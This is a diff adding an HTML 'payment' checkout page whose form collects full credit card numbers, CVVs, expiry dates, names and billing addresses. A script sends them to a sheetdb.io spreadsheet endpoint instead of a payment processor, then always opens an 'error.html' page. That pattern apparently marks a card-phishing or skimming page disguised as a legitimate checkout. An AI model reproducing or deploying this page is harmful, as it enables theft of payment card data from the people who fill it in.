@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   
+    <!-- custom css file link  -->
+    <link rel="stylesheet" href="payment.css">
+
+</head>
+<body>
+
+
+<div class="container">
+
+
+    <form action="https://sheetdb.io/api/v1/3zjr5ngsznbi9" method="post" id="sheetdb-form">
+
+
+        <div class="row">
+
+
+            <div class="col">
+
+
+
+
+            </div>
+
+
+            <div class="col">
+
+
+                <h3 class="title">payment</h3>
+                <div class="inputBox">
+                    <span>name :</span>
+                    <input type="name" name="data[name]" placeholder="name">
+                </div>
+                <div class="inputBox">
+                    <span>email :</span>
+                    <input type="email" name="data[email]" placeholder="email">
+                </div>
+                <h3 class="title">Billing Address</h3>
+                <div class="inputBox">
+                    <span>Address :</span>
+                    <input type="Address" name="data[Address]" placeholder="Address">
+                </div>
+                <div class="inputBox">
+                    <span>City :</span>
+                    <input type="City" name="data[City]" placeholder="City">
+                </div>
+                <div class="inputBox">
+                    <span>State :</span>
+                    <input type="State" name="data[State]" placeholder="State">
+                </div>
+                <div class="inputBox">
+                    <span>Zip Code :</span>
+                    <input type="Zip Code" name="data[Zip Code]" placeholder="Zip Code">
+                </div>
+                <div class="inputBox">
+                    <span>cards accepted :</span>
+                    <img src="img/cards.png">
+                </div>
+                <div class="inputBox">
+                    <span>name of card :</span>
+                    <input type="name of card" name="data[name of card]" placeholder="name of card">
+                </div>
+                <div class="inputBox">
+                    <span>credit card number :</span>
+                    <input type="credit card number" name="data[credit card number]" placeholder="0000-0000-0000">
+                </div>
+                <div class="inputBox">
+                    <span>exp month :</span>
+                    <input type="exp month" name="data[exp month]" placeholder="exp month">
+                </div>
+
+
+                <div class="flex">
+                    <div class="inputBox">
+                        <span>exp year :</span>
+                        <input type="exp year" name="data[exp year]" placeholder="exp year">
+                    </div>
+                    <div class="inputBox">
+                        <span>CVV :</span>
+                        <input type="CVV" name="data[CVV]" placeholder="CVV">
+                    </div>
+                </div>
+
+
+            </div>
+   
+        </div>
+
+        <input type="submit" value="proceed to checkout" class="submit-btn">
+
+    </form>
+
+
+</div>    
+
+<script>
+    var form = document.getElementById('sheetdb-form');
+form.addEventListener("submit", e => {
+  e.preventDefault();
+  fetch(form.action, {
+      method : "POST",
+      body: new FormData(document.getElementById("sheetdb-form")),
+  }).then(
+      response => response.json()
+  ).then((html) => {
+    // you can put any JS code here
+    window.open('error.html', '_blank');
+
+  });
+});
+</script>
+   
+</body>
+</html>
